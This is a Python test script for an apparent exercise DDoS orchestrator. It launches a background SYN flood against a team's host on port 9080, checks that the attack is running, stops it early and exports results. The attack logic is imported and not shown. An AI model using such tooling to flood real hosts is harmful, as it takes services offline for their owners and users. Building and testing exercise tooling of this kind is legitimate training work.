#!/usr/bin/env python3
"""
Test Script - Demonstrate Stop Functionality
This script shows how to launch and stop attacks
"""

from distributed_ddos_executor import DDoSOrchestrator
import time

def test_stop_functionality():
    """
    Test launching an attack and stopping it early
    """
    print("=" * 70)
    print("🧪 Testing DDoS Attack Stop Functionality")
    print("=" * 70)

    orchestrator = DDoSOrchestrator()

    # Test 1: Launch attack in background
    print("\n📋 Test 1: Launch SYN Flood in Background Mode")
    print("-" * 70)

    attack_ids = orchestrator.execute_distributed_attack(
        attack_type="syn_flood",
        target_team="team1",
        target_port=9080,
        duration=300,  # 5 minutes (but we'll stop it early)
        num_attackers=1,  # Just 1 attacker for testing
        capture_on_target=False,  # Skip capture for speed
        background=True  # ✅ Enable background mode
    )

    if not attack_ids:
        print("❌ No attacks launched - check connectivity")
        return

    print(f"✅ Launched {len(attack_ids)} attack(s)")
    for attack_id in attack_ids:
        print(f"   Attack ID: {attack_id}")

    # Test 2: Verify attack is running
    print("\n📋 Test 2: Verify Attack Status")
    print("-" * 70)

    time.sleep(2)  # Give it a moment to start

    for attack_id in attack_ids:
        status = orchestrator.get_attack_status(attack_id)
        print(f"Attack {attack_id[:8]}...")
        print(f"   Status: {status['status']}")
        print(f"   Tool: {status['tool']}")
        print(f"   Target: {status['target_ip']}:{status['target_port']}")
        print(f"   Started: {status['start_time']}")

        if status['status'] != 'running':
            print(f"   ⚠️  Warning: Expected 'running', got '{status['status']}'")

    # Test 3: Let attack run for a bit
    print("\n📋 Test 3: Let Attack Run for 10 Seconds")
    print("-" * 70)

    for i in range(10, 0, -1):
        print(f"   ⏳ {i} seconds remaining...", end='\r')
        time.sleep(1)
    print("   ✅ 10 seconds elapsed" + " " * 30)

    # Test 4: Stop the attack
    print("\n📋 Test 4: Stop Attack Early")
    print("-" * 70)

    for attack_id in attack_ids:
        print(f"🛑 Stopping attack {attack_id[:8]}...")
        success = orchestrator.stop_attack(attack_id)

        if success:
            print(f"   ✅ Attack stopped successfully")
        else:
            print(f"   ❌ Failed to stop attack")

    # Test 5: Verify attack is stopped
    print("\n📋 Test 5: Verify Attack Stopped")
    print("-" * 70)

    time.sleep(1)  # Give it a moment

    for attack_id in attack_ids:
        status = orchestrator.get_attack_status(attack_id)
        print(f"Attack {attack_id[:8]}...")
        print(f"   Status: {status['status']}")
        print(f"   Started: {status['start_time']}")
        print(f"   Ended: {status['end_time']}")

        if status['status'] == 'stopped':
            print(f"   ✅ Status correctly shows 'stopped'")
        else:
            print(f"   ⚠️  Warning: Expected 'stopped', got '{status['status']}'")

    # Test 6: Export results
    print("\n📋 Test 6: Export Results")
    print("-" * 70)

    output_file = f"/tmp/stop_test_results_{int(time.time())}.json"
    orchestrator.export_results(output_file)
    print(f"✅ Results exported to: {output_file}")

    # Summary
    print("\n" + "=" * 70)
    print("📊 Test Summary")
    print("=" * 70)
    print(f"✅ Attacks launched: {len(attack_ids)}")
    print(f"✅ Attacks stopped: {len(attack_ids)}")
    print(f"✅ Total duration: ~12 seconds (instead of 300 seconds)")
    print(f"✅ Time saved: ~288 seconds (96%)")
    print("\n🎉 Stop functionality working correctly!\n")

if __name__ == "__main__":
    try:
        test_stop_functionality()
    except KeyboardInterrupt:
        print("\n\n⚠️  Test interrupted by user")
    except Exception as e:
        print(f"\n\n❌ Test failed with error: {e}")
        import traceback
        traceback.print_exc()
